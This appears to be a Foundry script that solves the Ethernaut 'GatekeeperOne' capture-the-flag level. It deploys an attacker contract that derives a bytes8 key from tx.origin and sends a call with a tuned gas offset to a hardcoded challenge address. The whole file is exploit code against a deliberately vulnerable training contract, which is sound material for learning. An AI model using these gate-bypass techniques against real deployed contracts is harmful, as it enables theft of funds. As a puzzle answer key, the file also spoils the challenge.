// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {GatekeeperOne} from "src/13GatekeeperOne.sol";

contract HackGatekeeperOne {
    function enter(address _target, uint256 gas) external {
        GatekeeperOne target = GatekeeperOne(_target);
        // k = uint64(key)
        // 1. uint32(k) = uint16(k)
        // 2. uint32(k) != k
        // 3. uint32(k) == uint16(uint160(tx.origin))

        // 3. uint32(k) == uint16(uint160(tx.origin))
        // 1. uint32(k) = uint16(k)
        uint16 k16 = uint16(uint160(0x7b32DF263625bFCC9EdF743A382b81c2e1A567Ec));
        // 2. uint32(k) != k
        uint64 k64 = uint64(1 << 63) + uint64(k16);

        bytes8 key = bytes8(k64);

        require(gas < 8191, "gas > 8191");
        require(target.enter{gas: 8191 * 10 + gas}(key), "failed");
    }
}

contract GatekeeperOneAttack is Script {
    address constant CHALLENGE = 0x76b5918948abe12f49aA33377a872f0e45D552f8;
    GatekeeperOne public gatekeeperOne = GatekeeperOne(CHALLENGE);
    HackGatekeeperOne public hackGatekeeperOne;

    function run() public {
        vm.startBroadcast(); // Starts broadcasting transactions
        hackGatekeeperOne = new HackGatekeeperOne();
        console.log("HackGatekeeperOne deployed at:", address(hackGatekeeperOne));

        // Use the verified offset found on the fork to send a single on-chain attempt
        hackGatekeeperOne.enter(CHALLENGE, 256);
        console.log("Entrant", gatekeeperOne.entrant());
        vm.stopBroadcast();

        // Solved when HackGatekeeperOne use in remix using gas = 256 or 416
    }
}
